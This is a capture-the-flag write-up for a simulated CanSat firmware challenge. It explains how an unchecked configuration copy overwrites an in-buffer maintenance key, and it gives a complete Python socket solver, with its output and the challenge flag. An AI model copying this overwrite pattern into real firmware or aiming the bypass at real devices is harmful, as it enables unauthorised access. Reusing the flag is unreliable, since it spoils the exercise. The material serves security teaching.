# 305-satellite-sabotage-sim

| | |
|---|---|
| **Category** | 03 — Orbital Oops at Mission Control |
| **Points** | 125 |

## Description

This is where the theft was always heading. With the board understood, the intruder's last move was the flight computer itself — the Foundation One CanSat. We have the flight firmware on a bench rig that speaks the same command link the real unit does over its radio. The question the team is asking: could someone on that link make the CanSat say something it was never meant to say?

The rig takes the same uplink frames the CanSat accepts in flight. Most of them are harmless — ping it, read its telemetry. One of them is not as careful as it looks about how much it is handed, and there is a service page the firmware will only show once it believes you are maintenance. The exposed service header on the board was not a coincidence. Make the firmware believe you, and read the page it is hiding.

Get the CanSat to dump its service telemetry.

**Flag format:** `GAIANSPACE{...}`

**Attachments:**
- `foundation_one_fw.py` — the flight firmware, running on the bench rig
- `Dockerfile, docker-compose.yml` — to stand the rig up yourself

## Solution

### Analysis

Inspect `Sat.__init__`, `Sat.cfg`, and `Sat.auth` in `foundation_one_fw.py`:

```python
self.mem = bytearray(24)
self.mem[16:20] = os.urandom(4)

# In cfg():
for i in range(len(payload)):
    self.mem[i] = payload[i]

# In auth():
if len(key4) == 4 and bytes(key4) == bytes(self.mem[16:20]):
    self.maint = True
```

The configuration command accepts a variable-length byte sequence and starts copying it at index zero **without enforcing the logical 16-byte configuration region**. The service key is stored in `mem[16:20]` within the same 24-byte buffer. Consequently, 20 configuration bytes remain inside the Python bytearray but overwrite the key's protected logical region. This is **not** a write past the 24-byte Python buffer.

An attacker can send 16 padding bytes followed by four attacker-chosen bytes (here ASCII `ABCD`), authenticate with the same four bytes, then issue the maintenance-only `DUMP` command. The provided exploit now parses the firmware's AST and finds the `os.urandom(...)` assignment to a `self.mem[start:end]` slice, so the service-key offset is discovered from the artifact instead of copied from prior analysis.

### Reproduction

Run the supplied local service in one terminal:

```bash
python3 foundation_one_fw.py
```

In another terminal, with `foundation_one_fw.py` and `305.py` in the same directory:

```bash
python3 305.py
```

The solver defaults to `127.0.0.1:9707`; optional host and port arguments are supported. Expected relevant output:

```text
Firmware service-key region: mem[16:20]
Foundation One CanSat link up. HELP for commands.
CFG 0000000000000000000000000000000041424344: CFG LOADED 20 bytes
AUTH 41424344: MAINT OK
DUMP: SVC TLM imu=A3387 co2=A5190 radio=A4075 payload=GAIANSPACE{c4nsat_t3lemetry_pwn3d}
FLAG: GAIANSPACE{c4nsat_t3lemetry_pwn3d}
```

No third-party Python packages are required; `foundation_one_fw.py` uses only the standard library. The exploit does not need to know the randomly generated original service key.

### Solver Code

```python

#!/usr/bin/env python3
# Dependencies: Python 3 standard library only.

import ast
from pathlib import Path
import re
import socket
import sys

FIRMWARE = Path("foundation_one_fw.py")


def service_key_offset(source: str) -> tuple[int, int]:
    # Recover the service-key slice from Sat.__init__, without executing firmware.
    tree = ast.parse(source)
    for node in ast.walk(tree):
        if not isinstance(node, ast.Assign):
            continue
        for target in node.targets:
            if not isinstance(target, ast.Subscript):
                continue
            if not isinstance(target.value, ast.Attribute) or target.value.attr != "mem":
                continue
            if not isinstance(target.slice, ast.Slice):
                continue
            lo = target.slice.lower
            hi = target.slice.upper
            if not isinstance(lo, ast.Constant) or not isinstance(hi, ast.Constant):
                continue
            if not isinstance(node.value, ast.Call):
                continue
            if isinstance(node.value.func, ast.Attribute) and node.value.func.attr == "urandom":
                return int(lo.value), int(hi.value)
    raise ValueError("Unable to locate firmware maintenance-key range")


HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9707

# Extract the key's memory range from the supplied firmware before exploiting CFG.
key_start, key_end = service_key_offset(FIRMWARE.read_text(encoding="utf-8"))
new_key = b"ABCD"
if key_end - key_start != len(new_key):
    raise ValueError("Service-key length differs from the expected protocol key size")
print(f"Firmware service-key region: mem[{key_start}:{key_end}]")
payload = bytes(key_start) + new_key

commands = [
    b"CFG " + payload.hex().encode("ascii"),
    b"AUTH " + new_key.hex().encode("ascii"),
    b"DUMP",
]

with socket.create_connection((HOST, PORT), timeout=10) as sock:
    stream = sock.makefile("rb")

    print(stream.readline().decode("ascii").strip())

    for command in commands:
        sock.sendall(command + b"\n")
        response = stream.readline().decode("ascii").strip()
        print(f"{command.decode('ascii')}: {response}")

        if command.startswith(b"AUTH ") and response != "MAINT OK":
            raise RuntimeError("Authentication failed")

        if command == b"DUMP":
            match = re.search(r"GAIANSPACE\{[^}]+\}", response)
            if match is None:
                raise RuntimeError("Flag not found")
            print(f"\nFLAG: {match.group(0)}")
```

## Flag

```text
GAIANSPACE{c4nsat_t3lemetry_pwn3d}
```
